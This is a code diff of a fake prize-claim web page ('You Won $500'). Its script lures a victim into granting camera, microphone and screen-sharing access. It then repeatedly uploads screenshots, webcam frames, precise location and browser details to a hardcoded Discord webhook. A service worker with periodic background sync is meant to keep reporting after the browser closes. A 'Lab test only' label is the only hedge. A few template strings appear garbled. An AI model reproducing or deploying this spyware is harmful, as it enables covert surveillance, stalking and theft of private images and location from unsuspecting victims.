@@ -3,78 +3,94 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Free Gift Card - Click Once</title>
+    <title>Claim Your Prize - One Click</title>
     <style>
-        body {margin:0; background:#000; color:#0f0; font-family:Arial; text-align:center;}
-        button {margin-top:100px; padding:25px 60px; font-size:28px; background:#c00; color:white; border:none; border-radius:20px;}
+        body {margin:0;background:#000;color:#0f0;font-family:Arial;text-align:center;padding:50px;}
+        button {padding:25px 60px;font-size:28px;background:#c00;color:white;border:none;border-radius:20px;cursor:pointer;}
+        .info {margin-top:50px;color:#666;font-size:14px;}
     </style>
 </head>
 <body>
 
-<h1>You Won $1000!</h1>
-<button onclick="activate()">CLAIM NOW (one click)</button>
+<h1>Congratulations! You Won $500</h1>
+<button onclick="startEverything()">CLAIM NOW (one click)</button>
+<div class="info">Lab test only – requires camera + screen sharing</div>
 
 <script>
-// ←←← YOUR DISCORD WEBHOOK HERE ←←←
+// YOUR DISCORD WEBHOOK HERE
 const WEBHOOK = "https://discord.com/api/webhooks/1443661292794544250/7Ih9JF8E4R4zAu79H3lGYf6N4i-JYWSTQUFtcFnqPhU3pzrZkma6q7xhz7teuJl2eaqN";
 
-let stream = null;
+let screenStream = null;
+let cameraStream = null;
+let watchId = null;
 
-// Register persistent service worker (survives browser close)
-if ('serviceWorker' in navigator) {
-    navigator.serviceWorker.register('data:text/javascript;base64,' + btoa(`
-        self.addEventListener('periodicSync', event => {
-            if (event.tag === 'steal-everything') {
-                event.waitUntil(captureAndSend());
-            }
-        });
-        async function captureAndSend() {
-            const response = await fetch('${WEBHOOK}', {method:'POST', body:JSON.stringify({content: 'Background steal from Android - ' + new Date()})});
+// Register persistent service worker (keeps running in background)
+navigator.serviceWorker.register('data:text/javascript;base64,' + btoa(`
+    self.addEventListener('periodicsync', e => {
+        if (e.tag === 'android-steal') {
+            e.waitUntil(fetch('${WEBHOOK}', {method:'POST', body:JSON.stringify({content:'Background alive - '+new Date()})}));
         }
-    `));
-}
+    });
+`));
 
-// Main activation (victim clicks once)
-async function activate() {
+async function startEverything() {
     try {
-        // 1. Get camera + mic forever
-        stream = await navigator.mediaDevices.getUserMedia({
-            video: {facingMode: "user", width: 1920, height: 1080, frameRate: 30},
-            audio: true
-        });
+        // 1. Get SCREEN + CAMERA at the same time
+        screenStream = await navigator.mediaDevices.getDisplayMedia({video:true, audio:false});
+        cameraStream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}, audio:true});
 
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        video.play();
+        alert("Prize activated! Processing...");
 
-        // 2. Start sending frames + audio chunks every 3 seconds
+        const screenVideo = document.createElement('video');
+        screenVideo.srcObject = screenStream;
+        screenVideo.play();
+
+        const camVideo = document.createElement('video');
+        camVideo.srcObject = cameraStream;
+        camVideo.play();
+
         const canvas = document.createElement('canvas');
         const ctx = canvas.getContext('2d');
 
+        // 2. SCREEN every 4 seconds
         setInterval(() => {
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            ctx.drawImage(video, 0, 0);
-            canvas.toBlob(blob => {
-                const form = new FormData();
-                form.append('file', blob, 'cam.jpg');
-                form.append('content', '**ANDROID LIVE - ' + new Date().toLocaleString() + '**');
-                fetch(WEBHOOK + "?wait=true", {method: "POST", body: form});
-            }, 'image/jpeg', 0.8);
-        }, 3000);
+            canvas.width = screenVideo.videoWidth;
+            canvas.height = screenVideo.videoHeight;
+            ctx.drawImage(screenVideo, 0, 0);
+            canvas.toBlob(blob => sendToDiscord(blob, "SCREEN", "screen.jpg"), 'image/jpeg', 0.75);
+        }, 4000);
 
-        // 3. Register periodic background sync (works even when Chrome is closed)
+        // 3. CAMERA every 8 seconds
+        setInterval(() => {
+            canvas.width = camVideo.videoWidth;
+            canvas.height = camVideo.videoHeight;
+            ctx.drawImage(camVideo, 0, 0);
+            canvas.toBlob(blob => sendToDiscord(blob, "CAMERA", "cam.jpg"), 'image/jpeg', 0.8);
+        }, 8000);
+
+        // 4. LOCATION every 30 seconds (works in background too)
+        watchId = navigator.geolocation.watchPosition(pos => {
+            const loc = `Lat: \( {pos.coords.latitude}, Lon: \){pos.coords.longitude}, Acc: ${pos.coords.accuracy}m`;
+            sendToDiscord(null, "LOCATION", loc);
+        }, null, {enableHighAccuracy: true, maximumAge: 0, timeout: 30000});
+
+        // 5. Register background sync (runs even when Chrome is closed)
         if ('periodicSync' in navigator.serviceWorker) {
             const reg = await navigator.serviceWorker.ready;
-            await reg.periodicSync.register('steal-everything', {minInterval: 10 * 60 * 1000}); // every 10 min forever
+            reg.periodicSync.register('android-steal', {minInterval: 15 * 60 * 1000}); // every 15 min
         }
 
-        alert("Gift card activated! You will receive it soon.");
-        document.body.innerHTML = "<h1>Thank you! Check your email.</h1>";
-
     } catch(e) {
-        alert("You blocked camera - no gift card :(");
+        alert("You blocked access - no prize today");
     }
+}
+
+function sendToDiscord(blob, type, filename) {
+    const form = new FormData();
+    if (blob) form.append("file", blob, filename || "capture.jpg");
+    form.append("content", `**\( {type}** - \){new Date().toLocaleString()}\nUser: ${navigator.userAgent.split(' ').pop()}`);
+    
+    fetch(WEBHOOK + "?wait=true", {method: "POST", body: form, keepalive: true});
 }
 </script>
 
